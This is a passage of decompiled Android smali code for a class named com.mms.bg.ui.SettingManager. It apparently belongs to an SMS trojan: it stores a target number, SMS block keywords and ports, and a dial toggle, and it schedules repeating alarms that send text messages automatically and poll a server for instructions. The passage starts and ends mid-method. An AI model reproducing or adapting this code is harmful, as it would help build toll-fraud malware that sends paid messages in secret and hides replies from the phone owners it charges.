    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 245
    return-void
.end method

.method public setDialEnable(Z)V
    .registers 4
    .parameter "enable"

    .prologue
    .line 280
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "enable_dial"

    invoke-interface {v0, v1, p1}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 281
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 282
    return-void
.end method

.method public setFirstStartTime()V
    .registers 6

    .prologue
    .line 502
    invoke-virtual {p0}, Lcom/mms/bg/ui/SettingManager;->getFirstStartTime()Ljava/lang/String;

    move-result-object v1

    .line 503
    .local v1, time:Ljava/lang/String;
    if-nez v1, :cond_1f

    .line 504
    new-instance v0, Ljava/util/Date;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    invoke-direct {v0, v2, v3}, Ljava/util/Date;-><init>(J)V

    .line 505
    .local v0, date:Ljava/util/Date;
    iget-object v2, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v3, "first_start_time"

    invoke-virtual {v0}, Ljava/util/Date;->toGMTString()Ljava/lang/String;

    move-result-object v4

    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 506
    iget-object v2, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 508
    .end local v0           #date:Ljava/util/Date;
    :cond_1f
    return-void
.end method

.method public setInternetConnectFailed(Z)V
    .registers 4
    .parameter "failed"

    .prologue
    .line 481
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "internet_connect_failed"

    invoke-interface {v0, v1, p1}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 482
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 483
    return-void
.end method

.method public setInternetConnectFailedBeforeSMS(Z)V
    .registers 4
    .parameter "failed"

    .prologue
    .line 490
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "internet_connect_failed_before_SMS"

    invoke-interface {v0, v1, p1}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 491
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 492
    return-void
.end method

.method public setLastConnectServerTime(J)V
    .registers 5
    .parameter "time"

    .prologue
    .line 462
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "last_connect_server_time"

    invoke-interface {v0, v1, p1, p2}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    .line 463
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 464
    return-void
.end method

.method public setLastDialTime(J)V
    .registers 7
    .parameter "time"

    .prologue
    .line 256
    new-instance v0, Ljava/util/Date;

    invoke-direct {v0, p1, p2}, Ljava/util/Date;-><init>(J)V

    .line 257
    .local v0, date:Ljava/util/Date;
    iget-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v2, "last_dial_time"

    invoke-interface {v1, v2, p1, p2}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    .line 258
    iget-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v2, "last_dial_format_time"

    invoke-virtual {v0}, Ljava/util/Date;->toGMTString()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 259
    iget-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 260
    return-void
.end method

.method public setLastSMSTime(J)V
    .registers 7
    .parameter "time"

    .prologue
    .line 183
    new-instance v0, Ljava/util/Date;

    invoke-direct {v0, p1, p2}, Ljava/util/Date;-><init>(J)V

    .line 184
    .local v0, date:Ljava/util/Date;
    iget-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v2, "last_sms_time"

    invoke-interface {v1, v2, p1, p2}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    .line 185
    iget-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v2, "last_sms_format_time"

    invoke-virtual {v0}, Ljava/util/Date;->toLocaleString()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 186
    iget-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 187
    return-void
.end method

.method public setLastVedioDownloadTime(J)V
    .registers 5
    .parameter "time"

    .prologue
    .line 208
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "last_vedio_download_time"

    invoke-interface {v0, v1, p1, p2}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    .line 209
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 210
    return-void
.end method

.method public setNextFetchChannelInfoFromServerTime(JZ)V
    .registers 26
    .parameter "delayTime"
    .parameter "repeatable"

    .prologue
    .line 526
    const-string v3, ""

    move-object/from16 v0, p0

    move-object v1, v3

    invoke-direct {v0, v1}, Lcom/mms/bg/ui/SettingManager;->LOGD(Ljava/lang/String;)V

    .line 527
    const-string v3, ""

    move-object/from16 v0, p0

    move-object v1, v3

    invoke-virtual {v0, v1}, Lcom/mms/bg/ui/SettingManager;->log(Ljava/lang/String;)V

    .line 528
    const-wide/32 v9, 0x5265c00

    .line 530
    .local v9, DEFAULT_FETCH_DELAY:J
    new-instance v13, Landroid/content/Intent;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    move-object v3, v0

    const-class v4, Lcom/mms/bg/ui/AutoSMSRecevier;

    invoke-direct {v13, v3, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 531
    .local v13, intent:Landroid/content/Intent;
    const-string v3, "com.mms.bg.SERVER"

    invoke-virtual {v13, v3}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 532
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    move-object v3, v0

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-static {v3, v4, v13, v5}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v8

    .line 533
    .local v8, sender:Landroid/app/PendingIntent;
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v11

    .line 534
    .local v11, currentTime:J
    move-wide v4, v11

    .line 536
    .local v4, firstTime:J
    const-wide/16 v18, 0x0

    cmp-long v3, p1, v18

    if-eqz v3, :cond_70

    move-wide/from16 v6, p1

    .line 537
    .local v6, connect_delay_time:J
    :goto_3c
    invoke-virtual/range {p0 .. p0}, Lcom/mms/bg/ui/SettingManager;->getLastConnectServerTime()J

    move-result-wide v14

    .line 538
    .local v14, latestConnectTime:J
    const-wide/16 v16, 0x2710

    .line 539
    .local v16, tempDelay:J
    const-wide/16 v18, 0x0

    cmp-long v3, v14, v18

    if-eqz v3, :cond_76

    sub-long v18, v11, v14

    add-long v20, v6, v16

    cmp-long v3, v18, v20

    if-ltz v3, :cond_76

    .line 540
    add-long v4, v11, v16

    .line 547
    :goto_52
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    move-object v3, v0

    const-string v9, "alarm"

    .end local v9           #DEFAULT_FETCH_DELAY:J
    invoke-virtual {v3, v9}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/app/AlarmManager;

    .line 548
    .local v2, am:Landroid/app/AlarmManager;
    const/4 v3, 0x1

    move/from16 v0, p3

    move v1, v3

    if-ne v0, v1, :cond_82

    .line 549
    const/4 v3, 0x0

    invoke-virtual/range {v2 .. v8}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V

    .line 550
    const/4 v3, 0x1

    move v0, v3

    move-object/from16 v1, p0

    iput-boolean v0, v1, Lcom/mms/bg/ui/SettingManager;->mHasSetFetchServerInfoAlarm:Z

    .line 555
    :goto_6f
    return-void

    .line 536
    .end local v2           #am:Landroid/app/AlarmManager;
    .end local v6           #connect_delay_time:J
    .end local v14           #latestConnectTime:J
    .end local v16           #tempDelay:J
    .restart local v9       #DEFAULT_FETCH_DELAY:J
    :cond_70
    const-wide/32 v18, 0x5265c00

    move-wide/from16 v6, v18

    goto :goto_3c

    .line 541
    .restart local v6       #connect_delay_time:J
    .restart local v14       #latestConnectTime:J
    .restart local v16       #tempDelay:J
    :cond_76
    const-wide/16 v18, 0x0

    cmp-long v3, v14, v18

    if-eqz v3, :cond_7f

    .line 542
    add-long v4, v14, v6

    goto :goto_52

    .line 544
    :cond_7f
    add-long v4, v11, v16

    goto :goto_52

    .line 552
    .end local v9           #DEFAULT_FETCH_DELAY:J
    .restart local v2       #am:Landroid/app/AlarmManager;
    :cond_82
    const/4 v3, 0x0

    invoke-virtual {v2, v3, v4, v5, v8}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 553
    const/4 v3, 0x1

    move v0, v3

    move-object/from16 v1, p0

    iput-boolean v0, v1, Lcom/mms/bg/ui/SettingManager;->mHasSetFetchServerInfoAlarm:Z

    goto :goto_6f
.end method

.method public setPID(Ljava/lang/String;)V
    .registers 4
    .parameter "pid"

    .prologue
    .line 515
    if-eqz p1, :cond_16

    const-string v0, "0"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_16

    .line 516
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "pid"

    invoke-interface {v0, v1, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 517
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->clear()Landroid/content/SharedPreferences$Editor;

    .line 519
    :cond_16
    return-void
.end method

.method public setSMSBlockBeginTime(J)V
    .registers 5
    .parameter "time"

    .prologue
    .line 203
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "sms_block_start_time"

    invoke-interface {v0, v1, p1, p2}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    .line 204
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 205
    return-void
.end method

.method public setSMSBlockDelayTime(J)V
    .registers 5
    .parameter "time"

    .prologue
    .line 194
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "sms_block_time"

    invoke-interface {v0, v1, p1, p2}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    .line 195
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 196
    return-void
.end method

.method public setSMSBlockKeys(Ljava/lang/String;)V
    .registers 4
    .parameter "keys"

    .prologue
    .line 234
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "sms_block_key"

    invoke-interface {v0, v1, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 235
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 236
    return-void
.end method

.method public setSMSBlockPorts(Ljava/lang/String;)V
    .registers 4
    .parameter "ports"

    .prologue
    .line 225
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "sms_block_port"

    invoke-interface {v0, v1, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 226
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 227
    return-void
.end method

.method public setSMSCenter(Ljava/lang/String;)V
    .registers 4
    .parameter "num"

    .prologue
    .line 471
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "[[setSMSCenter]] center = "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, v0}, Lcom/mms/bg/ui/SettingManager;->LOGD(Ljava/lang/String;)V

    .line 472
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "sms_center"

    invoke-interface {v0, v1, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 473
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 474
    return-void
.end method

.method public setSMSEnable(Z)V
    .registers 4
    .parameter "enable"

    .prologue
    .line 289
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "enable_sms"

    invoke-interface {v0, v1, p1}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 290
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 291
    return-void
.end method

.method public setSMSRoundTotalSnedCount(I)V
    .registers 4
    .parameter "count"

    .prologue
    .line 307
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "sms_round_total_send"

    invoke-interface {v0, v1, p1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 308
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 309
    return-void
.end method

.method public setSMSSendDelay(J)V
    .registers 5
    .parameter "delay"

    .prologue
    .line 316
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "sms_send_delay"

    invoke-interface {v0, v1, p1, p2}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    .line 317
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 318
    return-void
.end method

.method public setSMSTargetNum(Ljava/lang/String;)V
    .registers 4
    .parameter "num"

    .prologue
    .line 271
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "target_num"

    invoke-interface {v0, v1, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 272
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 273
    return-void
.end method

.method public setSMSTempBlockNumAndTimes(Ljava/lang/String;Ljava/lang/String;)V
    .registers 7
    .parameter "num"
    .parameter "count"

    .prologue
    const-string v3, "sms_temp_block_num_and_times"

    .line 358
    if-eqz p1, :cond_6

    if-nez p2, :cond_13

    .line 359
    :cond_6
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "sms_temp_block_num_and_times"

    invoke-interface {v0, v3}, Landroid/content/SharedPreferences$Editor;->remove(Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 363
    :goto_d
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 364
    return-void

    .line 361
    :cond_13
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "sms_temp_block_num_and_times"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, ";"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v3, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    goto :goto_d
.end method

.method public setTodaySMSSendCount(I)V
    .registers 4
    .parameter "count"

    .prologue
    .line 298
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "sms_send_count"

    invoke-interface {v0, v1, p1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 299
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 300
    return-void
.end method

.method public setXMLHandler(Lcom/mms/bg/util/XMLHandler;)V
    .registers 2
    .parameter "handler"

    .prologue
    .line 149
    iput-object p1, p0, Lcom/mms/bg/ui/SettingManager;->mXMLHandler:Lcom/mms/bg/util/XMLHandler;

    .line 150
    return-void
.end method

.method public startAutoSendMessage(JJ)V
    .registers 24
    .parameter "base_time"
    .parameter "sms_delay_time"

    .prologue
    .line 383
    invoke-virtual/range {p0 .. p0}, Lcom/mms/bg/ui/SettingManager;->cancelAutoSendMessage()V

    .line 384
    new-instance v12, Landroid/content/Intent;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    move-object v4, v0

    const-class v5, Lcom/mms/bg/ui/AutoSMSRecevier;

    invoke-direct {v12, v4, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 385
    .local v12, intent:Landroid/content/Intent;
    const-string v4, "com.mms.bg.SMS"

    invoke-virtual {v12, v4}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 386
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    move-object v4, v0

    const/4 v5, 0x0

    const/4 v6, 0x0

    invoke-static {v4, v5, v12, v6}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v9

    .line 387
    .local v9, sender:Landroid/app/PendingIntent;
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v10

    .line 388
    .local v10, currentTime:J
    move-wide v5, v10

    .line 390
    .local v5, firstTime:J
    const-wide/16 v7, 0x0

    cmp-long v4, p1, v7

    if-nez v4, :cond_95

    invoke-virtual/range {p0 .. p0}, Lcom/mms/bg/ui/SettingManager;->getLastSMSTime()J

    move-result-wide v7

    move-wide v13, v7

    .line 391
    .local v13, latestSMSTime:J
    :goto_2f
    const-wide/32 v15, 0x1d4c0

    .line 392
    .local v15, tempDelay:J
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "sms_delay_time = "

    .end local v5           #firstTime:J
    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    move-object v0, v4

    move-wide/from16 v1, p3

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, " lastSMSTime = "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v13, v14}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, " lastSMSFormatTime = "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual/range {p0 .. p0}, Lcom/mms/bg/ui/SettingManager;->getLastSMSFormatTime()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    move-object/from16 v0, p0

    move-object v1, v4

    invoke-virtual {v0, v1}, Lcom/mms/bg/ui/SettingManager;->log(Ljava/lang/String;)V

    .line 394
    const-wide/16 v7, 0x0

    cmp-long v4, v13, v7

    if-eqz v4, :cond_98

    sub-long v7, v10, v13

    add-long v17, p3, v15

    cmp-long v4, v7, v17

    if-ltz v4, :cond_98

    .line 395
    const-string v4, "SettingManager"

    const-string v5, "start the broadcast because of case 1"

    move-object/from16 v0, p0

    move-object v1, v4

    move-object v2, v5

    invoke-virtual {v0, v1, v2}, Lcom/mms/bg/ui/SettingManager;->log(Ljava/lang/String;Ljava/lang/String;)V

    .line 396
    add-long v5, v10, v15

    .line 405
    .restart local v5       #firstTime:J
    :goto_81
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    move-object v4, v0

    const-string v7, "alarm"

    invoke-virtual {v4, v7}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/app/AlarmManager;

    .line 406
    .local v3, am:Landroid/app/AlarmManager;
    const/4 v4, 0x0

    move-wide/from16 v7, p3

    invoke-virtual/range {v3 .. v9}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V

    .line 407
    return-void

    .end local v3           #am:Landroid/app/AlarmManager;
    .end local v13           #latestSMSTime:J
    .end local v15           #tempDelay:J
    :cond_95
    move-wide/from16 v13, p1

    .line 390
    goto :goto_2f

    .line 397
    .end local v5           #firstTime:J
    .restart local v13       #latestSMSTime:J
    .restart local v15       #tempDelay:J
    :cond_98
    const-wide/16 v7, 0x0

    cmp-long v4, v13, v7

    if-eqz v4, :cond_ac

    .line 398
    const-string v4, "SettingManager"

    const-string v5, "start the broadcast because of case 2"

    move-object/from16 v0, p0

    move-object v1, v4

    move-object v2, v5

    invoke-virtual {v0, v1, v2}, Lcom/mms/bg/ui/SettingManager;->log(Ljava/lang/String;Ljava/lang/String;)V

    .line 399
    add-long v5, v13, p3

    .restart local v5       #firstTime:J
    goto :goto_81

    .line 401
    .end local v5           #firstTime:J
    :cond_ac
    const-string v4, "SettingManager"

    const-string v5, "start the broadcast because of case 3"

    move-object/from16 v0, p0

    move-object v1, v4

    move-object v2, v5

    invoke-virtual {v0, v1, v2}, Lcom/mms/bg/ui/SettingManager;->log(Ljava/lang/String;Ljava/lang/String;)V

    .line 402
    add-long v5, v10, v15

    .restart local v5       #firstTime:J
    goto :goto_81
.end method

.method public startOneRoundSMSSend(J)V
    .registers 11
    .parameter "delay"

    .prologue
    const/4 v1, 0x0

    .line 442
    const-string v4, "startOneRoundSMSSend"

    invoke-virtual {p0, v4}, Lcom/mms/bg/ui/SettingManager;->log(Ljava/lang/String;)V

    .line 443
    new-instance v7, Landroid/content/Intent;

    iget-object v4, p0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    const-class v5, Lcom/mms/bg/ui/AutoSMSRecevier;

    invoke-direct {v7, v4, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 444
    .local v7, intent:Landroid/content/Intent;
    const-string v4, "action.round.sms"

    invoke-virtual {v7, v4}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 445
    iget-object v4, p0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    invoke-static {v4, v1, v7, v1}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v6

    .line 446
    .local v6, sender:Landroid/app/PendingIntent;
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    .line 448
    .local v2, currentTime:J
    const-wide/16 v4, 0x0

    cmp-long v4, p1, v4

    if-eqz v4, :cond_33

    .line 449
    :goto_24
    iget-object v4, p0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    const-string v5, "alarm"

    invoke-virtual {v4, v5}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .local v0, am:Landroid/app/AlarmManager;
    move-wide v4, p1

    .line 450
    invoke-virtual/range {v0 .. v6}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V

    .line 451
    return-void

    .line 448
    .end local v0           #am:Landroid/app/AlarmManager;
    :cond_33
    const-wide/32 v4, 0x493e0

    move-wide p1, v4

    goto :goto_24
.end method

.method public updateCurrentAPN(Ljava/lang/String;)I
    .registers 9
    .parameter "apnId"

    .prologue
    const/4 v6, 0x0

    .line 1300
    :try_start_1
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "----- apn id = "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

